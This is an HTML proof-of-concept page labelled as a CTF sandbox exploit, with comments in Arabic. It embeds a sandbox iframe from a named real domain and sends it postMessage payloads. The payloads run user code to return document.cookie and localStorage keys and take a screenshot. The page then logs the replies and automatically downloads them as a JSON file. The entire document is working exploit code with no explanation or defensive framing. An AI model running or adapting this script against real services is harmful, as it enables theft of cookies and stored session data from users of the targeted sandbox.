<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CTF Sandbox PoC</title>
</head>
<body>
  <h2>🚀 CTF Sandbox Exploit PoC</h2>

  <!-- الهدف -->
  <iframe id="victim" 
          src="https://web-sandbox.oaiusercontent.com/index.html?" 
          width="800" height="600"
          style="border:1px solid #ccc"></iframe>

  <pre id="log"></pre>

  <script>
    const victim = document.getElementById("victim").contentWindow;
    const targetOrigin = "https://web-sandbox.oaiusercontent.com";
    const collected = [];

    function log(msg, data) {
      const pre = document.getElementById("log");
      pre.textContent += msg + (data ? " " + JSON.stringify(data, null, 2) : "") + "\n";
      console.log(msg, data || "");
    }

    // استقبال الردود
    window.addEventListener("message", (event) => {
      if (event.origin !== targetOrigin) return; // تجاهل أي رد من غير الـ sandbox
      log("📩 Response from sandbox:", event.data);

      collected.push({
        origin: event.origin,
        data: event.data,
        time: new Date().toISOString()
      });

      // جرّب تنزل ملف بعد ما نجمع ردود
      if (collected.length >= 3) {
        downloadResults();
      }
    });

    // payloads نجربها
    const payloads = [
      ["CALL", "runUserCode", ["return document.cookie"]],
      ["CALL", "runUserCode", ["return Object.keys(localStorage)"]],
      ["CALL", "screenshot", []],
      ["CALL", "echo", [{ poc: "hello" }]]
    ];

    function sendPayloads() {
      payloads.forEach((msg, i) => {
        setTimeout(() => {
          log("➡️ Sending payload #" + i + ": " + msg[1]);
          victim.postMessage(msg, targetOrigin);
        }, i * 3000); // كل 3 ثواني
      });
    }

    function downloadResults() {
      const blob = new Blob([JSON.stringify(collected, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "sandbox_results_" + Date.now() + ".json";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      log("💾 File download triggered.");
    }

    // شغل بعد 5 ثواني
    setTimeout(() => {
      log("🚀 Starting payload sequence...");
      sendPayloads();
    }, 5000);
  </script>
</body>
</html>
